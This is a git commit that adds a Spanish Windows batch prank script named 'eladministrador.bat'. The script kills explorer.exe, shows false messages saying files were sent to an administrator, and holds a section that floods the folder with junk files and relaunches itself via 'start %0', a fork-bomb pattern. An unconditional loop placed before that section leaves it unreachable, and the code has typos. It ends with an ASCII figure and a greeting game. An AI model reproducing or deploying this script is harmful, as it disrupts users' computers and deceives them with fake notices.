af51603221424f7c2bf94338d3fce2b2472d0acd
WIF003 <98164269+WIF003@users.noreply.github.com>
2022-05-19 15:44:58 +0000

    Add files via upload

---
+++ eladministrador.bat
@@ -0,0 +1,100 @@
+echo off
+title Hola :)
+xd Desktop
+TASKKILL /F /IM explorer.exe
+msg * espere un momento.
+msg * espere un momento..
+msg * espere un momento...
+msg * los archivos han sido enviados al administrador correctamente
+set hoal = 1
+:bucle
+goto bucle
+:menu
+cls
+set /a hoal = %hoal% + 1
+echo xd>>%hoal%.txt
+echo xd>>%hoal%.docx
+echo xd>>%hoal%.pdf
+echo xd>>%hoal%.bat
+echo xd>>%hoal%.doc
+echo xd>>%hoal%.jpg
+echo xd>>%hoal%.vbs
+echo xd>>%hoal%.avi
+echo xd>>%hoal%.odt
+echo xd>>%hoal%.psd
+echo xd>>%hoam%.rar
+echo xd>>%hoam%.bmp
+echo xd>>%hoal%.flv
+echo xd>>%hoal%.dll
+echo xd>>%hoal%.pdf
+echo xd>>%hoal%.doc
+echo xd>>%hoal%.bat
+echo xd>>%hoal%.cpp
+echo xd>>%hoal%.jar
+echo xd>>%hoal%.html
+echo xd>>%hoal%.htm
+echo xd>>%hoal%.php
+echo xd>>%hoal%.css
+echo xd>>%hoal%.rar
+start %0
+goto menu
+cls
+echo off
+timeout /T 1 /nobreak
+echo estamos contactando al administrador...
+echo       FELICIDADES SE LOGRÓ CONTACTAR CON EL ADMINISTRADOR
+cls
+echo                        .
+echo                       ...
+echo                      .....
+echo                     .......
+echo %date% %time%       . °.° .   ...
+echo                     . --- .   
+echo                     .......
+echo                       /|\
+echo                      //|\\
+echo                 ///////\\\\\\\\
+echo                 \\\\\\\////////
+echo                      \\//
+echo                      \\//
+echo                      \\//
+echo                      \\//
+echo                      //\\
+echo                     //  \\
+echo                    //    \\
+echo                   //      \\
+set /p pass=Saludalo con un agradable Hola!!
+if %pass%==Hola (goto passcorrecto)
+if %pass%==Hola!! (goto passcorrecto)
+:passcorrecto
+timeout /t 1 /nobreak
+echo                        .
+echo                       ...
+echo                      .....
+echo                     .......
+echo %date% %time%       . °.° .   Oh Hola, eres de las pocas personas que aún saluda
+echo                     . --- .   gracias, ahora te daré la contraseña para salir de aquí
+echo                     .......            es: Terminar
+echo                       /|\      pero por favor no lo hagas al salir dejarás de pensar en mi
+echo                      //|\\     y seré olvidado. Te lo ruego
+echo                 ///////\\\\\\\\
+echo                 \\\\\\\////////
+echo                      \\//
+echo                      \\//
+echo                      \\//
+echo                      \\//
+echo                      //\\
+echo                     //  \\
+echo                    //    \\
+echo                   //      \\
+set /p pass=Quieres salir?
+if %pass%==si (goto passcorrecto)
+if %pass%==Si (goto passcorrecto)
+if %pass%==SI (goto passcorrecto)
+:passcorrecto
+echo Adios
+msg * Adios
+msg * Diviertete borrandome :)
+start explorer.exe
+pause
+exit
